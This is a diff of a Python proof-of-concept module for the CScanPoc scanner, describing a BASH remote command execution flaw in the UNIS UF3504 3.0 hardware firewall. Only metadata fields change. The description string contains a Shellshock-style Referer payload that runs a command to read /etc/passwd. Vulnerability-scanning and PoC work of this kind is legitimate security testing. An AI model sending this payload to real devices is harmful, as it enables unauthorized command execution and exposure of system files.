@@ -4,7 +4,7 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'UNIS_0002'  # 平台漏洞编号，留空
+    poc_id = '98d92634-2ed9-4057-95bd-ff1efe3f9fcb'
     name = '清华紫光硬件防火墙 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
@@ -12,9 +12,9 @@ class Vuln(ABVuln):
     desc = '''
         清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = '清华紫光硬件防火墙'  # 漏洞应用名称
     product_version = 'UF3504 3.0'  # 漏洞应用版本
 
